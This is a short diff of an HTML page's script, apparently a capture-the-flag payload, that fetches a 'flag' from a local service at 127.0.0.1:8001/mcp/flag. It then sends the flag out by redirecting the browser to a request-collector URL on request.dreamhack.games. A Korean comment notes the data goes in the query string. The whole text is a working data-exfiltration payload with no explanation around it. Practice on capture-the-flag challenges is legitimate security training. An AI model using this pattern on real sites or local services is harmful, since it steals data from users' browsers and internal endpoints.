@@ -6,12 +6,12 @@
  <script>
 async function readFlag() {
   try {
-    const res = await fetch('./flag', { cache: 'no-store' });
+    const res = await fetch('http://127.0.0.1:8001/mcp/flag', { cache: 'no-store' });
     if (!res.ok) throw new Error(`HTTP ${res.status}`);
     const text = (await res.text()).trim();
 
     // 길이가 짧을 때만 쿼리로 전송
-    const target = 'https://qkwmhnv.request.dreamhack.games?flag=' + encodeURIComponent(text);
+    const target = 'https://nmyqjtc.request.dreamhack.games?flag=' + encodeURIComponent(text);
     location.href = target; // 페이지 이동으로 전달
   } catch (e) {
     console.error(e);
